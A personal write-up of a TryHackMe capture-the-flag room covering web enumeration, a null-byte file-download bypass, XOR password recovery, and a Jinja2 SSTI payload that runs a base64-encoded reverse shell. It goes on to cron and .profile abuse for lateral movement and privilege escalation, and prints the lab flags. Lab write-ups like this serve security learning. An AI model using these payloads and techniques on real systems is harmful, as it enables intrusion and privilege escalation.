# Super Secret Tip

**Platform:** TryHackMe  
**Date:** 2026-08-21 
**Difficulty:** Medium 🟡  
**Category:** Web / SSTI / LFI / Privilege Escalation  
**Room URL:** https://tryhackme.com/room/supersecrettip
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

> This was a pretty tough TryHackMe room involving source-code disclosure, a file download bypass, password cracking, SSTI, a reverse shell, and finally a pretty nasty cron-based privilege escalation chain.

---

## 🔍 Reconnaissance

### Port Scan

I started with a RustScan to see what was exposed.

```bash
rustscan -a <MACHINE_IP>
```

The scan showed two open ports:

|Port|Service|Notes|
|---|---|---|
|22|SSH|SSH service|
|7777|HTTP / CBT|Web application|

The web service was the interesting one, so I opened it in the browser.

---

### Web Enumeration

The main webpage didn't reveal much, and checking the source didn't give me anything particularly useful either.

So, as usual, I moved on to directory enumeration.

```bash
gobuster dir -u http://<MACHINE_IP>:7777 -w /usr/share/wordlists/dirb/common.txt
```

Two directories stood out:

```text
/cloud
/debug
```

The `/debug` directory looked especially interesting. It had a debugger where I could apparently execute something, but it required a password.

There was also a suspicious-looking default input:

```text
1337 * 1337
```

That immediately reminded me of SSTI.

I didn't have the password yet, though, so I started with `/cloud`.

---

## 🧭 Steps I Took

### Step 1 — Enumerating the `/cloud` Directory

- **What I did:** Checked the files available for download in `/cloud`.
    
- **Command/Tool used:** Browser + directory enumeration
    

Some files could be downloaded, but most of them weren't useful.

One file stood out:

```text
templates.py
```

Looking at it showed that it was importing functionality from a Flask application.

I wanted to find the actual application source, so I started fuzzing the download functionality.

---

### Step 2 — Finding `source.py`

- **What I did:** Fuzzed the working download parameter to find files that weren't directly linked.
    
- **Command/Tool used:** Wfuzz
    

The fuzzing revealed that I could download another file:

```text
source.py
```

And this was a **massive** find.

The source code showed exactly how `/cloud` and `/debug` worked.

The important parts were:

```python
password = str(open('supersecrettip.txt').readline().strip())
```

and:

```python
if download[-4:] == '.txt':
    return send_from_directory(app.root_path, download, as_attachment=True)
```

The source also showed the `/debugresult` endpoint and the custom password-checking code.

---

### Step 3 — Understanding the Source Code

There were several useful pieces of information in `source.py`.

#### `supersecrettip.txt`

The application reads:

```text
supersecrettip.txt
```

and uses it as the expected encrypted password.

That meant this file was definitely worth getting.

#### `ip.py`

The `/debugresult` page imports:

```python
import ip
```

So `ip.py` was probably going to tell me why I couldn't access the page normally.

#### `debugpassword.py`

The application also imports:

```python
import debugpassword
```

and uses it here:

```python
encrypted_pass = str(debugpassword.get_encrypted(user_password))
```

So this file should tell me exactly how the debugger password is encrypted.

#### The SSTI sink

The most important part was:

```python
template = open('./templates/debugresult.html').read()
return render_template_string(
    template.replace('DEBUG_HERE', debug),
    success=True,
    error=""
)
```

That's SSTI.

The application takes my input and inserts it directly into a template before passing it to `render_template_string()`.

That is very, very interesting.

---

### Step 4 — Downloading `ip.py` and `debugpassword.py`

There was a restriction preventing me from downloading arbitrary files directly from `/cloud`.

So I looked for a way around it.

The application was checking for `.txt` files, which gave me an idea: I could append:

```text
%00.txt
```

to the filename to bypass the extension check.

Using that technique, I was able to retrieve:

```text
ip.py
debugpassword.py
```

---

### Step 5 — Understanding the IP Check

The `ip.py` source showed that `/debugresult` checks the request's IP information.

This meant I needed to send an:

```http
X-Forwarded-For:
```

header when accessing `/debugresult`.

---

### Step 6 — Recovering the Debugger Password

The `debugpassword.py` source showed how the application transforms the password.

I also had:

```text
supersecrettip.txt
```

which contained the encrypted value.

The encryption used the key:

```text
ayham
```

I used Python to convert the encoded value into the format I needed, then used CyberChef to XOR it with the key.

Eventually I got:

```text
AyhamDeebugg
```

And yep — that was the debugger password. 😏

---

### Step 7 — Testing for SSTI

Now I could finally test the thing I suspected earlier.

The classic first test:

```text
{{3*3}}
```

If SSTI was actually working, the application should evaluate it and return:

```text
9
```

I submitted it and then went to:

```text
/debugresult
```

with the required `X-Forwarded-For` header.

The result came back as:

```text
9
```

BOOM.

SSTI confirmed.

---

### Step 8 — Getting a Reverse Shell Through SSTI

Now that SSTI was confirmed, I needed to turn it into code execution.

Some characters were blocked by the application's `illegal_chars_check()` function:

```python
illegal = "'&;%"
```

So instead of trying to send a complicated payload directly, I encoded the reverse-shell command with Base64.

My SSTI payload was:

```jinja2
{{"".__class__.__mro__[1].__subclasses__()[415]("echo <BASE64_PAYLOAD> | base64 -d | bash",shell=True,stdout=-1).communicate()}}
```

I then listened on my machine for the connection.

The payload executed and I got a reverse shell.

The client-side restrictions were basically irrelevant at this point.

---

### Step 9 — Getting Flag 1

Once I had shell access, I checked the home directory.

The first flag was sitting there:

```text
THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}
```

🚩 **Flag 1 found.**

---

# 🔐 Privilege Escalation

### Step 10 — Enumerating the `ayham` Account

Now the real pain began. 😂

I started enumerating the `ayham` account and found an interesting cron job.

The cron job was running something related to:

```text
site_check
```

So I started checking the permissions of the files involved.

---

### Step 11 — Abusing `.profile`

I found that I couldn't modify the `site_check` file itself.

However, I **could** modify the `.profile` file in the `F30s` user's home directory.

That was interesting because `.profile` can be executed when the user logs in.

So I added a reverse-shell command to the `.profile` file.

Then I started listening on port `4444`:

```bash
nc -lvnp 4444
```

When `F30s` logged in, the command executed and I received a shell as:

```text
F30s
```

🚨 We had moved laterally to another user.

---

### Step 12 — Abusing `site_check`

Now that I was `F30s`, I had permissions that I didn't have before.

The `site_check` script was designed to check the contents of a URL.

The important part was that I could influence what URL it checked.

I realised that I could use:

```text
file:///
```

instead of a normal HTTP URL.

That effectively turned the URL checker into a local file reader.

Because `site_check` was being executed with elevated privileges, I could use it to read files that I normally shouldn't have access to.

And that meant I could read:

```text
flag2.txt
```

---

### Step 13 — Getting the Key for Flag 2

I managed to retrieve `flag2.txt`.

There was just one problem.

It was encrypted.

And I didn't have the key.

😐

I spent quite a while stuck here.

Then I remembered something I had seen earlier in `/cloud`:

```text
secret.txt
```

I used the same file-download technique to retrieve it.

And, of course...

It was encrypted too.

Because apparently this machine wasn't done messing with me yet. 😂

---

### Step 14 — Finding `secret-tip.txt`

I continued enumerating the filesystem and found:

```text
/secret-tip.txt
```

The file contained a strange hint:

```text
A wise *gpt* once said ...

In the depths of a hidden vault, the mastermind discovered that vital
▒▒▒▒▒ of their secret ▒▒▒▒▒▒ had vanished without a trace.
...
The past/back/before/not after actually matters, follow it!

Don't forget it's always about root!
```

The hint strongly suggested that the missing key was related to **root** and that the past/before/back wording mattered.

So I tried:

```text
root
```

And it worked for the next stage.

---

### Step 15 — Recovering the Flag 2 Key

The key wasn't used directly.

I first needed to convert it into hexadecimal using Python.

After doing that, I used CyberChef to decode the contents of `secret.txt`.

The result was:

```text
1109200013XX
```

So I knew the first part of the key.

The last two digits were still unknown.

I tested the possible values from:

```text
00–99
```

Eventually I found the correct key:

```text
110920001386
```

Using that key to decrypt `flag2.txt` finally gave me:

```text
THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}
```

🚩 **Flag 2 found.**

---

## 🛠 Commands Used

|Command / Tool|What It Does|
|---|---|
|`rustscan -a <IP>`|Scans the target for open ports|
|`gobuster dir ...`|Enumerates web directories|
|`wfuzz ...`|Fuzzes the download functionality to find hidden files|
|`curl ...`|Retrieves files and interacts with web endpoints|
|`python`|Used to transform encoded values|
|CyberChef|Used for XOR and other decoding operations|
|`nc -lvnp 4444`|Listens for reverse-shell connections|
|`linpeas`|Used for system enumeration and privilege escalation|
|`grep` / filesystem enumeration|Used to locate interesting files|

---

## 🚩 Flags Found

|Flag|Value|
|---|---|
|Flag 1|`THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}`|
|Flag 2|`THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}`|

---

## 💡 What I Learned

- **Source-code disclosure can completely change a web challenge.** Once I found `source.py`, I knew exactly what the application was doing instead of having to blindly attack it.
    
- **File download restrictions aren't always as secure as they look.** The extension check could be bypassed and allowed me to retrieve additional Python files.
    
- **SSTI is extremely powerful.** What started as a simple `{{3*3}}` test eventually became code execution and a reverse shell.
    
- **Small pieces of information matter.** `ip.py`, `debugpassword.py`, `supersecrettip.txt`, and `secret-tip.txt` each looked like separate pieces of the puzzle, but eventually they all connected.
    
- **Cron jobs can become dangerous when combined with writable files and weak application design.**
    
- **Sometimes the hardest part isn't exploitation — it's figuring out what the machine is trying to tell you.** The second flag took me way longer than the first one.
    

---

## ❓ What Confused Me / What to Research Next

- I want to learn more about **SSTI internals**, especially how Python/Jinja2 objects can be reached through template expressions.
    
- I want to understand the `__class__.__mro__.__subclasses__()` technique instead of treating it as just a payload I found.
    
- I also want to practice more **cron privilege escalation**, especially attacks involving writable user files and scripts executed by another account.
    
- The encryption/encoding part of this room took me the longest, so I want to get better at recognising what kind of transformation is being used from the data itself.
    

---

## 🔗 Linked Notes

- [Nmap](https://chatgpt.com/c/Nmap)
    
- [Gobuster](https://chatgpt.com/c/Gobuster)
    
- [Wfuzz](https://chatgpt.com/c/Wfuzz)
    
- [SSTI](https://chatgpt.com/c/SSTI)
    
- [Jinja2](https://chatgpt.com/c/Jinja2)
    
- [LFI](https://chatgpt.com/c/LFI)
    
- [Reverse Shells](https://chatgpt.com/c/Reverse%20Shells)
    
- [Cron Privilege Escalation](https://chatgpt.com/c/Cron%20Privilege%20Escalation)
    
- [CyberChef](https://chatgpt.com/c/CyberChef)
    
- [Linux Commands](https://chatgpt.com/c/Linux%20Commands)
    

---

## 📎 Resources Used

- TryHackMe — Super Secret Tip
    
- OWASP — Server-Side Template Injection
    
- CyberChef
    
- Nmap
    
- Gobuster
    
- Wfuzz
    
- Netcat
    

---

_Report written in_ [_TryHackMe Vault_](https://chatgpt.com/c/TryHackMe%20Vault) _— part of my ethical hacking journey 🛡️_